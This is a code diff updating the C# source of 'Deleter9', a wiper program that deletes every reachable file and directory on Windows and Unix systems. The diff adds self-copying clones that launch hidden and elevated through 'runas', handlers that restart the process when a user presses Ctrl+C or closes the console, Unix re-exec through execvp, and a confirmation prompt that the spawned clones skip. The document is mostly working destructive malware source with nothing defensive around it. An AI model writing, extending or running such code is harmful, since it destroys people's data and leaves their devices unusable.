@@ -2,6 +2,8 @@ namespace System
 {
     public class OS
     {
+        public bool IsWindows;
+        public string ProcessFilePath;
         private static bool CapitalizeContains(string a, string b)
         {
             a = Capitalize(a);
@@ -16,138 +18,119 @@ namespace System
             }
             char[] a = str.ToLower().ToCharArray();
             a[0] = char.ToUpper(a[0]);
-            return new string(a);
-        }
-        public static string RestartPath = Reflection.Assembly.GetEntryAssembly().Location;
-        public virtual bool IsWindows 
-        {
-            get
-            {
-                return false;
-            } 
-        }
-        public virtual string ProcessFilePath
-        {
-            get
-            {
-                return "Unknown";
-            }
+            return new(a);
         }
         public virtual void RestartProcess()
         {
-            Diagnostics.Process.Start(RestartPath);
+            Diagnostics.Process.Start(Reflection.Assembly.GetEntryAssembly().Location);
         }
-        public static OS DetectedOS = new();
-        public static void DetectCurrentOS()
+        public static string GetExePath()
         {
-            if (DetectedOS == null || DetectedOS == new OS())
-            {
-                DetectedOS = GetCurrentOS();
-            }
+            return Reflection.Assembly.GetEntryAssembly().Location;
         }
-        private unsafe static OS GetCurrentOS()
+        public static string GetRuntimeExePath()
         {
-            PlatformID platform = Environment.OSVersion.Platform;
-            if (platform == PlatformID.Win32S)
+            return Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        }
+        public static bool RunningOnMono()
+        {
+            return Type.GetType("Mono.Runtime") != null;
+        }
+        public unsafe static OS GetCurrentOS()
+        {
+            if (RunningOnMono())
             {
-                return new WindowsOS();
-            }
-            else if (platform == PlatformID.Win32Windows)
-            {
-                return new WindowsOS();
-            }
-            else if (platform == PlatformID.Win32NT)
-            {
-                return new WindowsOS();
-            }
-            else if (platform == PlatformID.WinCE)
-            {
-                return new WindowsOS();
-            }
-            else if (platform == PlatformID.Xbox)
-            {
-                return new WindowsOS();
-            }
-            else if (platform == PlatformID.Unix)
-            {
-                sbyte* utsname = stackalloc sbyte[8192];
-                uname(utsname);
-                string kernel = new(utsname);
-                if (CapitalizeContains(kernel, "Linux"))
-                {
-                    return new LinuxOS();
-                }
-                else if (CapitalizeContains(kernel, "Unix"))
-                {
-                    return new UnixOS();
-                }
-                else
-                {
-                    return new UnixOS();
-                }
-            }
-            else if (platform == PlatformID.MacOSX)
-            {
-                return new UnixOS();
+                return new Mono();
             }
             else
             {
-                sbyte* utsname = stackalloc sbyte[8192];
-                uname(utsname);
-                string kernel = new(utsname);
-                if (CapitalizeContains(kernel, "Windows"))
+                PlatformID platform = Environment.OSVersion.Platform;
+                OS win = new Win(),
+                    unix = new Unix(),
+                    linux = new Linux();
+                if (platform == PlatformID.Win32S)
                 {
-                    return new WindowsOS();
+                    return win;
                 }
-                else if (CapitalizeContains(kernel, "Linux"))
+                else if (platform == PlatformID.Win32Windows)
                 {
-                    return new LinuxOS();
+                    return win;
                 }
-                else if (CapitalizeContains(kernel, "Unix"))
+                else if (platform == PlatformID.Win32NT)
                 {
-                    return new UnixOS();
+                    return win;
+                }
+                else if (platform == PlatformID.WinCE)
+                {
+                    return win;
+                }
+                else if (platform == PlatformID.Xbox)
+                {
+                    return win;
+                }
+                else if (platform == PlatformID.Unix)
+                {
+                    sbyte* utsname = stackalloc sbyte[8192];
+                    uname(utsname);
+                    string kernel = new(utsname);
+                    if (CapitalizeContains(kernel, "Linux"))
+                    {
+                        return linux;
+                    }
+                    else if (CapitalizeContains(kernel, "Unix"))
+                    {
+                        return unix;
+                    }
+                    else
+                    {
+                        return unix;
+                    }
+                }
+                else if (platform == PlatformID.MacOSX)
+                {
+                    return unix;
                 }
                 else
                 {
-                    return new UnixOS();
+                    sbyte* utsname = stackalloc sbyte[8192];
+                    uname(utsname);
+                    string kernel = new(utsname);
+                    if (CapitalizeContains(kernel, "Windows"))
+                    {
+                        return win;
+                    }
+                    else if (CapitalizeContains(kernel, "Linux"))
+                    {
+                        return linux;
+                    }
+                    else if (CapitalizeContains(kernel, "Unix"))
+                    {
+                        return unix;
+                    }
+                    else
+                    {
+                        return unix;
+                    }
                 }
             }
         }
         [Runtime.InteropServices.DllImport("libc")]
         public unsafe static extern void uname(sbyte* uname_struct);
     }
-    public class WindowsOS : OS
+    public class Win : OS
     {
-        public override string ProcessFilePath
+        public Win()
         {
-            get
-            {
-                return IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
-            }
-        }
-        public override bool IsWindows 
-        { 
-            get 
-            { 
-                return true; 
-            } 
+            IsWindows = true;
+            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
         }
     }
-    public class UnixOS : OS
+    public class Unix : OS
     {
-        public override string ProcessFilePath
+        public Unix()
         {
-            get
-            {
-                return IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
-            }
-        }
-        public override bool IsWindows
-        { 
-            get 
-            { 
-                return false; 
-            } 
+            IsWindows = false;
+            ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
         }
         public override void RestartProcess()
         {
@@ -155,53 +138,27 @@ namespace System
         }
         public virtual void RestartInPlace()
         {
-            string exe = GetProcessExePath();
-            execvp(exe, new string[] 
-            { 
-                exe,
-                RestartPath, 
-                null 
+            execvp(GetRuntimeExePath(), new string[]
+            {
+                GetRuntimeExePath(),
+                GetExePath(),
+                null
             });
-            Console.Out.WriteLine("execvp {0} failed: {1}", exe, Runtime.InteropServices.Marshal.GetLastWin32Error());
-            execvp("mono", new string[] 
-            { 
+            Console.Out.WriteLine("execvp {0} failed: {1}", GetRuntimeExePath(), Runtime.InteropServices.Marshal.GetLastWin32Error());
+            if (RunningOnMono())
+            {
+                execvp("mono", new string[]
+                {
                 "mono",
-                RestartPath, 
-                null 
-            });
-            Console.Out.WriteLine("execvp mono failed: {0}", Runtime.InteropServices.Marshal.GetLastWin32Error());
+                GetExePath(),
+                null
+                });
+                Console.Out.WriteLine("execvp mono failed: {0}", Runtime.InteropServices.Marshal.GetLastWin32Error());
+            }
         }
         [Runtime.InteropServices.DllImport("libc", SetLastError = true)]
         public static extern int execvp(string path, string[] argv);
-        public static string GetProcessExePath()
-        {
-            return Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        }
-    }
-    public class LinuxOS : UnixOS
-    {
-        public override string ProcessFilePath
-        {
-            get
-            {
-                return IO.Path.GetFullPath(GetProcessExePath());
-            }
-        }
-        public override void RestartInPlace()
-        {
-            try
-            {
-                string exe = GetProcessExePath();
-                string[] args = GetProcessCommandLineArgs();
-                execvp(exe, args);
-            }
-            catch (Exception ex)
-            {
-                Console.Out.WriteLine("Error restarting process: {0}", ex);
-            }
-            base.RestartInPlace();
-        }
-        private static string[] GetProcessCommandLineArgs()
+        public static string[] GetProcessCommandLineArgs()
         {
             using IO.StreamReader r = new("/proc/self/cmdline");
             string[] args = r.ReadToEnd().Split('\0');
@@ -209,12 +166,69 @@ namespace System
             return args;
         }
     }
+    public class Mono : Unix
+    {
+        public Mono()
+        {
+            IsWindows = false;
+            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+        }
+        public override void RestartProcess()
+        {
+            try
+            {
+                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
+            }
+            catch (Exception ex)
+            {
+                Console.Out.WriteLine("Error restarting process: {0}", ex);
+            }
+            RestartInPlace();
+        }
+    }
+    public class Linux : Unix
+    {
+        public Linux()
+        {
+            IsWindows = false;
+            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+        }
+        public override void RestartInPlace()
+        {
+            try
+            {
+                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
+            }
+            catch (Exception ex)
+            {
+                Console.Out.WriteLine("Error restarting process: {0}", ex);
+            }
+            base.RestartInPlace();
+        }
+    }
     public class Deleter
     {
+        [Runtime.InteropServices.DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+        public delegate bool ConsoleEventDelegate(int eventType);
+        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
+        public const string Ver = "1.1", Title = "Deleter9 v" + Ver;
+        private static string[] LogicalDrives;
+        private static Collections.Generic.List<IO.DriveInfo> Disks = new()
+        {
+        };
         private static readonly Collections.Generic.List<string> DirectoriesList = new()
         {
         };
-        public static bool CanAccess(string folderPath, out Exception ex)
+        private static string FileName = string.Empty,
+            FileExtension = string.Empty;
+        private static double Double, LoopingDouble, Count = 0;
+        private static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        private static readonly string[] Messages = Argument.Split('\n');
+        private static bool FileDeleted = false, IsCloned = false;
+        private static Exception Exception;
+        private static bool CanAccess(string folderPath, out Exception ex)
         {
             IO.DirectoryInfo dirInfo = new(folderPath);
             try
@@ -231,6 +245,17 @@ namespace System
         }
         private static Collections.Generic.List<string> AddDir(string dir)
         {
+            if (!DirectoriesList.Contains(dir))
+            {
+                if (CanAccess(dir, out Exception ex))
+                {
+                    DirectoriesList.Add(dir);
+                }
+                else
+                {
+                    Console.Out.WriteLine("Can't access " + dir + ex);
+                }
+            }
             foreach (string d in IO.Directory.GetDirectories(dir))
             {
                 if (CanAccess(d, out Exception ex))
@@ -245,18 +270,6 @@ namespace System
             }
             return DirectoriesList;
         }
-        public const string Ver = "1.0", Title = "Deleter9 v" + Ver;
-        private static string[] LogicalDrives;
-        private static Collections.Generic.List<IO.DriveInfo> Disks = new()
-        {
-        };
-        private static string FileName = string.Empty,
-            FileExtension = string.Empty;
-        private static double Double, LoopingDouble, Count = 0;
-        private static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
-        private static readonly string[] Messages = Argument.Split('\n');
-        private static bool FileDeleted;
-        private static Exception Exception;
         private static void TryDeleteFile(string file)
         {
             if (IO.File.Exists(file))
@@ -321,7 +334,7 @@ namespace System
                         foreach (string file in files)
                         {
                             TryDeleteFile(file);
-                            if (FileDeleted == false)
+                            if (!FileDeleted)
                             {
                                 Console.Out.WriteLine("Failed to delete file: " + file);
                                 Console.Out.WriteLine(Exception);
@@ -329,13 +342,13 @@ namespace System
                         }
                     }
                 }
-                catch 
+                catch
                 {
                     DeleteDirUnix();
                 }
             }
         }
-        public static void DeleteDirUnix()
+        private static void DeleteDirUnix()
         {
             try
             {
@@ -380,7 +393,7 @@ namespace System
                 }
             }
         }
-        public static void DeleteDir()
+        private static void DeleteDir()
         {
             try
             {
@@ -432,7 +445,7 @@ namespace System
                 }
             }
         }
-        public static void ContinueDeleting()
+        private static void ContinueDeleting()
         {
             try
             {
@@ -488,39 +501,26 @@ namespace System
                 }
             }
         }
-        public delegate bool ConsoleEventDelegate(int eventType);
-        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
-        public static ConsoleEventDelegate Handler;
-        public static bool ConsoleEventCallback(int eventType)
+        private static bool ConsoleEventCallback(int eventType)
         {
-            OS.DetectedOS.RestartProcess();
+            OS.GetCurrentOS().RestartProcess();
             return false;
         }
-        public static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
+        private static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
         {
-            OS.DetectedOS.RestartProcess();
+            OS.GetCurrentOS().RestartProcess();
         }
-        [Runtime.InteropServices.DllImport("ntdll.dll")]
-        public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-        public static bool PreviousValue = false;
-        public static void Continue(string[] args)
+        private static void Continue()
         {
-            OS.DetectCurrentOS();
-            FileExtension = IO.Path.GetExtension(OS.DetectedOS.ProcessFilePath);
-            FileName = IO.Path.GetFileNameWithoutExtension(OS.DetectedOS.ProcessFilePath);
-            if (OS.DetectedOS.IsWindows)
+            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
+            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
+            if (OS.GetCurrentOS().IsWindows)
             {
                 Console.CancelKeyPress += OnCancelKeyPress;
-                Handler = new(ConsoleEventCallback);
-                SetConsoleCtrlHandler(Handler, true);
+                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
                 Console.Title = Title;
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.BackgroundColor = ConsoleColor.Black;
-            }
-            if (args == null || args.Length == 0)
-            {
-                args = Messages;
             }
             Threading.Thread.Sleep(1000);
             while (Double != double.PositiveInfinity)
@@ -528,19 +528,19 @@ namespace System
                 try
                 {
                     Double++;
-                    if (!OS.DetectedOS.IsWindows)
+                    if (!OS.GetCurrentOS().IsWindows)
                     {
                         DeleteDirUnix();
                     }
                     else
                     {
-                        IO.File.Copy(IO.Path.GetFileName(OS.DetectedOS.ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
+                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                         Diagnostics.Process p = new();
                         p.StartInfo.UseShellExecute = true;
                         p.StartInfo.Verb = "runas";
                         p.StartInfo.FileName = FileName + "(" +
                             Double + ")" + FileExtension;
-                        p.StartInfo.Arguments = Argument;
+                        p.StartInfo.Arguments = "cloned " + Argument;
                         p.StartInfo.CreateNoWindow = false;
                         p.StartInfo.RedirectStandardOutput = true;
                         p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
@@ -553,28 +553,77 @@ namespace System
                     while (LoopingDouble != double.PositiveInfinity)
                     {
                         LoopingDouble++;
-                        Main(args);
+                        Start();
                     }
                 }
             }
         }
         public static void Main(string[] args)
         {
-            OS.DetectCurrentOS();
-            FileExtension = IO.Path.GetExtension(OS.DetectedOS.ProcessFilePath);
-            FileName = IO.Path.GetFileNameWithoutExtension(OS.DetectedOS.ProcessFilePath);
-            if (OS.DetectedOS.IsWindows)
+            string arguments = "";
+            foreach (string arg in args)
+            {
+                arguments += arg;
+            }
+            if (arguments.ToLower().Contains("cloned"))
+            {
+                IsCloned = true;
+            }
+            else
+            {
+                IsCloned = false;
+            }
+            if (!IsCloned)
+            {
+                Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
+                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+                Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
+                if (!Console.ReadLine().ToUpper().Contains("Y"))
+                {
+                    Environment.Exit(0);
+                    return;
+                }
+            }
+            if (Security.Principal.WindowsIdentity.GetCurrent().IsSystem 
+                || Security.Principal.WindowsIdentity.GetCurrent().User.ToString() == "S-1-5-18"  
+                || new Security.Principal.WindowsPrincipal(Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(Security.Principal.WindowsBuiltInRole.Administrator))
+            {
+                Start();
+            }
+            else
+            {
+                try
+                {
+                    Diagnostics.Process p = new();
+                    p.StartInfo.FileName = Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                    p.StartInfo.RedirectStandardOutput = false;
+                    p.StartInfo.RedirectStandardError = false;
+                    p.StartInfo.CreateNoWindow = false;
+                    p.StartInfo.UseShellExecute = true;
+                    p.StartInfo.Verb = "runas";
+                    p.StartInfo.Arguments = Argument;
+                    p.Start();
+                    Environment.Exit(0);
+                }
+                catch (Exception e)
+                {
+                    Console.Out.WriteLine("Error when deleting: {0}", e);
+                    Console.ReadKey();
+                    Environment.Exit(0);
+                }
+            }
+        }
+        private static void Start()
+        {
+            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
+            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
+            if (OS.GetCurrentOS().IsWindows)
             {
                 Console.CancelKeyPress += OnCancelKeyPress;
-                Handler = new(ConsoleEventCallback);
-                SetConsoleCtrlHandler(Handler, true);
+                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
                 Console.Title = Title;
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.BackgroundColor = ConsoleColor.Black;
-            }
-            if (args == null || args.LongLength == 0)
-            {
-                args = Messages;
             }
             Threading.Thread.Sleep(1000);
             while (Double != double.PositiveInfinity)
@@ -582,19 +631,19 @@ namespace System
                 try
                 {
                     Double++;
-                    if (!OS.DetectedOS.IsWindows)
+                    if (!OS.GetCurrentOS().IsWindows)
                     {
                         DeleteDirUnix();
                     }
                     else
                     {
-                        IO.File.Copy(IO.Path.GetFileName(OS.DetectedOS.ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
+                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                         Diagnostics.Process p = new();
                         p.StartInfo.UseShellExecute = true;
                         p.StartInfo.Verb = "runas";
                         p.StartInfo.FileName = FileName + "(" +
                             Double + ")" + FileExtension;
-                        p.StartInfo.Arguments = Argument;
+                        p.StartInfo.Arguments = "cloned " + Argument;
                         p.StartInfo.CreateNoWindow = false;
                         p.StartInfo.RedirectStandardOutput = true;
                         p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
@@ -607,7 +656,7 @@ namespace System
                     while (LoopingDouble != double.PositiveInfinity)
                     {
                         LoopingDouble++;
-                        Continue(args);
+                        Continue();
                     }
                 }
             }
